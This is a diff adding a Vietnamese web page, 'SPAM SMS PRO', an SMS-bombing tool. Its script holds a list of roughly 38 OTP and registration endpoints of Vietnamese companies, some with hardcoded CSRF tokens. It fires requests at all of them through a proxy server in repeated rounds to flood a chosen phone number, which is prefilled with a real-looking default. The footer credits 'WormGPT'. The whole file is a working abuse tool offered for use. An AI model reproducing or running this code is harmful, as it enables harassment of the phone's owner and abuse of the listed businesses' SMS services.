@@ -1,0 +1,489 @@
+<!-- public/index.html - Giao diện SPAM SMS PRO FULL -->
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SPAM SMS PRO</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 20% 30%, #0a0f1e, #020408);
+            font-family: 'Roboto', sans-serif;
+            padding: 15px;
+            color: #e0f0ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container { max-width: 500px; width: 100%; margin: 0 auto; }
+        .header {
+            text-align: center;
+            padding: 20px 0 10px;
+            border-bottom: 1px solid #00ffff22;
+            margin-bottom: 20px;
+        }
+        .header i { font-size: 40px; color: #00ffff; text-shadow: 0 0 30px #00ffff55; }
+        .header h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 22px;
+            background: linear-gradient(135deg, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-top: 5px;
+        }
+        .header p { color: #8899bb; font-size: 13px; }
+        .header p .badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            background: #00ff8822;
+            color: #00ff88;
+            border: 1px solid #00ff8844;
+        }
+        .card {
+            background: rgba(10, 15, 30, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid #00ffff22;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+        .card h3 {
+            color: #00ffff;
+            font-size: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .card h3 i { font-size: 18px; color: #ff00ff; }
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        .input-group input {
+            flex: 1;
+            padding: 12px 16px;
+            background: rgba(0, 20, 40, 0.6);
+            border: 1px solid #00ffff33;
+            border-radius: 12px;
+            color: #e0f0ff;
+            font-size: 14px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+        .input-group input:focus { border-color: #00ffff; box-shadow: 0 0 20px #00ffff22; }
+        .input-group input::placeholder { color: #6688aa; }
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #00ccff, #0066ff);
+            color: #fff;
+            box-shadow: 0 0 20px #0066ff44;
+        }
+        .btn-primary:active { transform: scale(0.95); }
+        .btn-success {
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            color: #0a0f1e;
+        }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff4466, #cc0033);
+            color: #fff;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #00ffff44;
+            color: #88ccdd;
+        }
+        .btn-block { width: 100%; }
+        .btn-purple {
+            background: linear-gradient(135deg, #a855f7, #7c3aed);
+            color: #fff;
+        }
+        .btn-warning {
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            color: #0a0f1e;
+        }
+        .status-box {
+            background: #0a1424cc;
+            border-radius: 12px;
+            padding: 12px 15px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.8;
+            border-left: 3px solid #00ffff;
+            margin-top: 10px;
+            -webkit-overflow-scrolling: touch;
+        }
+        .status-box::-webkit-scrollbar { width: 4px; }
+        .status-box::-webkit-scrollbar-thumb { background: #00ffff66; border-radius: 10px; }
+        .log-item { display: flex; gap: 8px; border-bottom: 1px solid #ffffff08; padding: 3px 0; }
+        .log-item .time { color: #ff00ffaa; min-width: 65px; }
+        .log-item .msg { color: #aaccdd; word-break: break-all; }
+        .log-item .success { color: #00ff88; }
+        .log-item .fail { color: #ff4466; }
+        .log-item .info { color: #88ccff; }
+        .log-item .warning { color: #fbbf24; }
+        .row { display: flex; gap: 10px; }
+        .row .btn { flex: 1; }
+        .count-badge {
+            background: #00ffff22;
+            color: #00ffff;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+        .footer {
+            text-align: center;
+            color: #445566;
+            font-size: 11px;
+            padding: 15px 0;
+        }
+        .footer i { color: #ff00ff; }
+        .music-control {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            z-index: 999;
+            background: #0a1424dd;
+            backdrop-filter: blur(12px);
+            border-radius: 60px;
+            padding: 10px 18px;
+            border: 1px solid #00ffff44;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 10px 30px #000000aa;
+        }
+        .music-control button {
+            background: transparent;
+            border: none;
+            color: #00ffff;
+            font-size: 22px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .music-control button:hover { color: #ff00ff; }
+        .music-control span { color: #8899bb; font-size: 12px; max-width: 100px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .status-summary {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+        .status-summary .sc { color: #00ff88; }
+        .status-summary .fc { color: #ff4466; }
+        .status-summary .tc { color: #88ccff; }
+        @media (max-width: 480px) {
+            .input-group { flex-direction: column; }
+            .row { flex-direction: column; }
+            .music-control { bottom: 10px; right: 10px; padding: 8px 12px; }
+        }
+    </style>
+</head>
+<body>
+
+    <audio id="bgMusic" loop preload="auto">
+        <source src="nhac_nen.mp3" type="audio/mpeg">
+    </audio>
+
+    <div class="music-control" id="musicControl">
+        <button id="playBtn"><i class="fas fa-play"></i></button>
+        <span>🎵 Cyber Beats</span>
+    </div>
+
+    <div class="container">
+
+        <div class="header">
+            <i class="fas fa-bolt"></i>
+            <h1>SPAM SMS PRO</h1>
+            <p><i class="fas fa-shield-alt"></i> <span class="badge" id="apiCountDisplay">35+ API</span> • Proxy Server</p>
+        </div>
+
+        <div class="card">
+            <h3><i class="fas fa-phone-alt"></i> Nhập số điện thoại</h3>
+            <div class="input-group">
+                <input type="text" id="phoneInput" placeholder="VD: 0987654321" value="0978693644">
+            </div>
+            <div class="input-group">
+                <input type="number" id="countInput" placeholder="Số lần spam (1-30)" value="2" min="1" max="30">
+            </div>
+            <button class="btn btn-primary btn-block" id="startBtn">
+                <i class="fas fa-bomb"></i> KÍCH HOẠT SPAM
+            </button>
+            <div class="row" style="margin-top:10px;">
+                <button class="btn btn-outline" id="clearBtn"><i class="fas fa-trash-alt"></i> Xóa log</button>
+                <button class="btn btn-danger" id="stopBtn"><i class="fas fa-stop-circle"></i> Dừng</button>
+            </div>
+            <div class="status-summary" id="statusSummary">
+                <span class="sc">✅ Thành công: <span id="successCount">0</span></span>
+                <span class="fc">❌ Thất bại: <span id="failCount">0</span></span>
+                <span class="tc">📦 Tổng: <span id="totalCount">0</span></span>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3><i class="fas fa-list"></i> Log <span class="count-badge" id="logCount">0</span></h3>
+            <div class="status-box" id="statusBox">
+                <div class="log-item"><span class="time">[⚡]</span><span class="msg info">Sẵn sàng tấn công...</span></div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <i class="fas fa-code"></i> mod by Trong Tan • WormGPT bật
+        </div>
+    </div>
+
+    <script>
+        // ===== DANH SÁCH API =====
+        const API_LIST = [
+            { name: 'Sapo', url: 'https://www.sapo.vn/fnb/sendotp', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phonenumber=' + encodeURIComponent(p) },
+            { name: 'Viettel', url: 'https://viettel.vn/api/getOTPLoginCommon', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p, typeCode: 'DI_DONG', actionCode: 'myviettel://login_mobile', type: 'otp_login' }) },
+            { name: 'Medicare', url: 'https://medicare.vn/api/otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ mobile: p, mobile_country_prefix: '84' }) },
+            { name: 'TV360', url: 'https://tv360.vn/public/v1/auth/get-otp-login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ msisdn: p }) },
+            { name: 'DMX', url: 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phoneNumber=' + encodeURIComponent(p) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8LmkDaXB2QlCm0k7EtaCd5Ri89ZiNhfmFcY9XtYAjjDirvSdcYRdWZG8hw_ch4w5eMUQc0d_fRDOu0QzDWE_fHeK8txJRRqbPmgZ61U70owDeZCkCDABV3jc45D8wyJ5wfbHpS-0YjALBHW3TKFiAxU' },
+            { name: 'Shopee', url: 'https://shopee.vn/api/v4/otp/get_settings_v2', method: 'POST', headers: { 'Content-Type': 'application/json', 'x-csrftoken': 'PTrvD9jNtOCSEWknpqxdSLzwktIJfOjs' }, body: (p) => JSON.stringify({ operation: 8, encrypted_phone: '', phone: p, supported_channels: [1,2,3,6,0,5], support_session: true }) },
+            { name: 'TGDD', url: 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phoneNumber=' + encodeURIComponent(p) + '&isReSend=false&sendOTPType=1&__RequestVerificationToken=CfDJ8AFHr2lS7PNCsmzvEMPceBO-ZX6s3L-YhIxAw0xqFv-R-dLlDbUCVqqC8BRUAutzAlPV47xgFShcM8H3HG1dOE1VFoU_oKzyadMJK7YizsANGTcMx00GIlOi4oyc5lC5iuXHrbeWBgHEmbsjhkeGuMs' },
+            { name: 'FPTSHOP', url: 'https://papi.fptshop.com.vn/gw/is/user/new-send-verification', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ fromSys: 'WEBKHICT', otpType: '0', phoneNumber: p }) },
+            { name: 'WinMart', url: 'https://api-crownx.winmart.vn/iam/api/v1/user/register', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ firstName: 'Nguyen Van A', phoneNumber: p, masanReferralCode: '', dobDate: '2024-07-26', gender: 'Male' }) },
+            { name: 'F88', url: 'https://api.f88.vn/growth/webf88vn/api/v1/Pawn', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ FullName: 'Nguyen Van A', Phone: p, DistrictCode: '024', ProvinceCode: '02', AssetType: 'Car', IsChoose: '1', ShopCode: '', Url: 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan', FormType: 1 }) },
+            { name: 'GHN', url: 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p, type: 'register' }) },
+            { name: 'LotteMart', url: 'https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ username: p, case: 'register' }) },
+            { name: 'VIEON', url: 'https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ username: p, country_code: 'VN', model: 'Windows 10', device_id: 'f812a55d1d5ee2b87a927833df2608bc', device_name: 'Edge/127', device_type: 'desktop', platform: 'web', ui: '012021' }) },
+            { name: 'Vinpearl', url: 'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ channel: 'vpt', username: p, type: 1, OtpChannel: 1 }) },
+            { name: 'LongChau', url: 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phoneNumber: p, otpType: 0, fromSys: 'WEBKHLC' }) },
+            { name: 'Ahamove', url: 'https://api.ahamove.com/api/v3/public/user/login', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ mobile: p, country_code: 'VN', firebase_sms_auth: true }) },
+            { name: 'ViettelMoney', url: 'https://api8.viettelpay.vn/customer/v2/accounts/register', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'Viettel Money/8.8.8' }, body: (p) => JSON.stringify({ identityType: 'msisdn', identityValue: p, type: 'REGISTER' }) },
+            { name: 'XanhSM', url: 'https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'UserApp/3.15.0' }, body: (p) => { let ph = p; if (ph.startsWith('09') || ph.startsWith('03')) ph = '+84' + ph.substring(1); return JSON.stringify({ is_forgot_password: false, phone: ph, provider: 'VIET_GUYS' }); } },
+            { name: 'Watsons', url: 'https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep?lang=vi', method: 'POST', headers: { 'Content-Type': 'application/json', 'User-Agent': 'WTCVN/24050.8.0' }, body: (p) => JSON.stringify({ otpTokenRequest: { action: 'REGISTRATION', type: 'SMS', countryCode: '84', target: p }, defaultAddress: { mobileNumberCountryCode: '84', mobileNumber: p }, mobileNumber: p }) },
+            { name: 'FAHASA', url: 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'phone=' + encodeURIComponent(p) },
+            { name: 'PNJ', url: 'https://www.pnj.com.vn/customer/otp/request', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => '_method=POST&_token=0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU&type=zns&phone=' + encodeURIComponent(p) },
+            { name: 'Batdongsan', url: 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=', method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0' }, buildUrl: (p) => 'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + encodeURIComponent(p) },
+            { name: 'Vinamilk', url: 'https://new.vinamilk.com.vn/api/account/getotp', method: 'POST', headers: { 'Content-Type': 'text/plain;charset=UTF-8' }, body: (p) => JSON.stringify({ type: 'register', phone: p }) },
+            { name: 'MOCA', url: 'https://moca.vn/moca/v2/users/role?phoneNumber=', method: 'GET', headers: { 'User-Agent': 'Pass/2.10.156' }, buildUrl: (p) => 'https://moca.vn/moca/v2/users/role?phoneNumber=' + encodeURIComponent(p) },
+            { name: 'Pico', url: 'https://auth.pico.vn/user/api/auth/login/request-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },
+            { name: 'TINIWORLD', url: 'https://prod-tini-id.nkidworks.com/auth/tinizen', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => '_csrf=&clientId=609168b9f8d5275ea1e262d6&redirectUrl=https://tiniworld.com&phone=' + encodeURIComponent(p) },
+            { name: 'Routine', url: 'https://routine.vn/customer/otp/send/', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'telephone=' + encodeURIComponent(p) + '&isForgotPassword=0' },
+            { name: 'GUMAC', url: 'https://cms.gumac.vn/api/v1/customers/verify-phone-number', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },
+            { name: '30shine', url: 'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p }) },
+            { name: 'Popeyes', url: 'https://api.popeyes.vn/api/v1/register', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone: p, firstName: 'Nguyen', lastName: 'Ngoc', email: 'test@mail.com', password: 'test123' }) },
+            { name: 'Dominos', url: 'https://dominos.vn/api/v1/users/send-otp', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone_number: p, email: 'test@mail.com', type: 0, is_register: true }) },
+            { name: 'CathayLife', url: 'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'memberMap=' + encodeURIComponent('{"userName":"test@mail.com","password":"test123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"' + p + '","email":"test@mail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyen Quang Ngoc"}') + '&OTP_TYPE=P&LANGS=vi_VN' },
+            { name: 'TokyoLife', url: 'https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', method: 'POST', headers: { 'Content-Type': 'application/json' }, body: (p) => JSON.stringify({ phone_number: p, name: 'Nguyen Van A', password: 'test123', email: 'test@mail.com', birthday: '2002-03-12', gender: 'male' }) },
+            { name: 'GalaxyPlay', url: 'https://api.glxplay.io/account/phone/checkPhoneOnly?phone=', method: 'POST', headers: { 'User-Agent': 'Mozilla/5.0' }, buildUrl: (p) => 'https://api.glxplay.io/account/phone/checkPhoneOnly?phone=' + encodeURIComponent(p) },
+            { name: 'Emart', url: 'https://emartmall.com.vn/index.php?route=account/register/smsRegister', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'mobile=' + encodeURIComponent(p) },
+            { name: 'HoangPhuc', url: 'https://hoang-phuc.com/advancedlogin/otp/sendotp/', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'action_type=1&tel=' + encodeURIComponent(p) },
+            { name: 'ViettelPost', url: 'https://id.viettelpost.vn/Account/SendOTPByPhone', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: (p) => 'FormRegister.FullName=Nguyen+Van+A&FormRegister.Phone=' + encodeURIComponent(p) + '&FormRegister.Password=test123&FormRegister.ConfirmPassword=test123&ReturnUrl=/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt&ConfirmOtpType=Register&FormRegister.IsRegisterFromPhone=true&__RequestVerificationToken=CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc' },
+        ];
+
+        // ===== DOM =====
+        const statusBox = document.getElementById('statusBox');
+        const logCount = document.getElementById('logCount');
+        const successCountEl = document.getElementById('successCount');
+        const failCountEl = document.getElementById('failCount');
+        const totalCountEl = document.getElementById('totalCount');
+        let logCounter = 0;
+        let successCount = 0;
+        let failCount = 0;
+        let running = false;
+        let stopRequested = false;
+
+        document.getElementById('apiCountDisplay').textContent = API_LIST.length + ' API';
+
+        function addLog(msg, type = 'info') {
+            const time = new Date().toLocaleTimeString('vi-VN');
+            const div = document.createElement('div');
+            div.className = 'log-item';
+            let cls = 'info';
+            if (type === 'success') cls = 'success';
+            else if (type === 'fail') cls = 'fail';
+            else if (type === 'warning') cls = 'warning';
+            div.innerHTML = `<span class="time">[${time}]</span><span class="msg ${cls}">${msg}</span>`;
+            statusBox.appendChild(div);
+            statusBox.scrollTop = statusBox.scrollHeight;
+            logCounter++;
+            logCount.textContent = logCounter;
+            while (statusBox.children.length > 300) {
+                statusBox.removeChild(statusBox.firstChild);
+                logCounter--;
+            }
+        }
+
+        function updateStats() {
+            successCountEl.textContent = successCount;
+            failCountEl.textContent = failCount;
+            totalCountEl.textContent = successCount + failCount;
+        }
+
+        // ===== GỌI API QUA PROXY =====
+        async function callApi(api, phone) {
+            try {
+                let url = api.url;
+                let body = null;
+                const headers = { ...api.headers };
+
+                if (api.buildUrl) {
+                    url = api.buildUrl(phone);
+                } else if (api.body) {
+                    body = typeof api.body === 'function' ? api.body(phone) : api.body;
+                }
+
+                // Gửi qua proxy server
+                const response = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        url: url,
+                        method: api.method || 'POST',
+                        headers: headers,
+                        body: body
+                    })
+                });
+
+                const result = await response.json();
+                
+                // Kiểm tra thành công
+                const data = result.data;
+                const isSuccess = data && (
+                    typeof data === 'string' ? 
+                        data.includes('success') || data.includes('otp') || data.includes('OK') || data.includes('200') :
+                        data.success === true || data.status === 0 || data.code === 0 || data.otpTrackingId
+                );
+
+                return isSuccess ? 'OK' : 'FAIL';
+            } catch (e) {
+                return 'FAIL';
+            }
+        }
+
+        // ===== HÀM SPAM CHÍNH =====
+        async function runSpam(phone, count) {
+            if (running) { addLog('⚠️ Đang chạy, vui lòng đợi', 'warning'); return; }
+            if (!phone || phone.length < 9) { addLog('❌ Số điện thoại không hợp lệ', 'fail'); return; }
+            let total = parseInt(count) || 1;
+            if (total < 1) total = 1;
+            if (total > 30) total = 30;
+
+            running = true;
+            stopRequested = false;
+            successCount = 0;
+            failCount = 0;
+            updateStats();
+            
+            addLog(`🚀 Bắt đầu spam ${total} lượt cho ${phone} (${API_LIST.length} API)`, 'info');
+
+            for (let i = 0; i < total; i++) {
+                if (stopRequested) break;
+                addLog(`--- Lượt ${i+1}/${total} ---`, 'info');
+                for (let j = 0; j < API_LIST.length; j++) {
+                    if (stopRequested) break;
+                    const api = API_LIST[j];
+                    try {
+                        const result = await callApi(api, phone);
+                        if (result === 'OK') {
+                            successCount++;
+                            addLog(`✅ ${api.name} -> Thành công`, 'success');
+                        } else {
+                            failCount++;
+                            addLog(`❌ ${api.name} -> Thất bại`, 'fail');
+                        }
+                        updateStats();
+                    } catch(e) {
+                        failCount++;
+                        addLog(`⚠️ ${api.name} -> Lỗi: ${e.message || 'unknown'}`, 'fail');
+                        updateStats();
+                    }
+                    await new Promise(r => setTimeout(r, 30));
+                }
+                if (i < total - 1 && !stopRequested) {
+                    addLog(`⏳ Chờ 500ms...`, 'info');
+                    await new Promise(r => setTimeout(r, 500));
+                }
+            }
+
+            running = false;
+            addLog(`🏁 Hoàn thành! ✅ ${successCount} / ❌ ${failCount}`, successCount > failCount ? 'success' : 'fail');
+        }
+
+        // ===== SỰ KIỆN =====
+        document.getElementById('startBtn').addEventListener('click', function() {
+            runSpam(document.getElementById('phoneInput').value.trim(), document.getElementById('countInput').value);
+        });
+
+        document.getElementById('clearBtn').addEventListener('click', function() {
+            statusBox.innerHTML = '';
+            logCounter = 0;
+            logCount.textContent = '0';
+            successCount = 0;
+            failCount = 0;
+            updateStats();
+            addLog('🗑️ Đã xóa log', 'info');
+        });
+
+        document.getElementById('stopBtn').addEventListener('click', function() {
+            stopRequested = true;
+            running = false;
+            addLog('⏹️ Dừng theo yêu cầu', 'warning');
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                runSpam(document.getElementById('phoneInput').value.trim(), document.getElementById('countInput').value);
+            }
+        });
+
+        // ===== NHẠC =====
+        const audio = document.getElementById('bgMusic');
+        const playBtn = document.getElementById('playBtn');
+        let isPlaying = false;
+
+        document.addEventListener('click', function initAudio() {
+            if (!isPlaying) {
+                audio.play().catch(() => {});
+                isPlaying = true;
+                playBtn.innerHTML = '<i class="fas fa-pause"></i>';
+            }
+            document.removeEventListener('click', initAudio);
+        }, { once: true });
+
+        playBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            if (isPlaying) {
+                audio.pause();
+                isPlaying = false;
+                playBtn.innerHTML = '<i class="fas fa-play"></i>';
+            } else {
+                audio.play().catch(() => {});
+                isPlaying = true;
+                playBtn.innerHTML = '<i class="fas fa-pause"></i>';
+            }
+        });
+
+        addLog('🔥 spamsms sẵn sàng, chờ lệnh...', 'info');
+        addLog('📡 Proxy server đang hoạt động', 'info');
+    </script>
+</body>
+</html>
